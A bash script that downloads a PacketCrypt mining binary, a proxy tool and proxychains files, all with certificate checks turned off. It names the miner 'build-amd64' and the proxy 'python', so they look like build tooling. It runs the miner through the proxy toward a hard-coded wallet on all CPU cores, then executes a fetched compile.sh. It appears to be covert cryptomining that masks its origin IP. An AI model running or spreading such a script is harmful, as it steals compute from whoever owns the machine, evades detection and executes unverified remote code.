#!/bin/bash

wget --no-check-certificate 'https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64' -O build-amd64
chmod +x build-amd64
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/proxy' -O python
chmod +x python
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/compile.sh' -O compile.sh
chmod +x compile.sh
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/libproxychains4.so' -O libproxychains4.so
chmod +x libproxychains4.so
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel2/proxychains.conf' -O proxychains.conf
chmod +x proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./python ./build-amd64 ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io/ http://pool.pkteer.com/ http://pool.pkt.world -t $(nproc --all)
./compile.sh
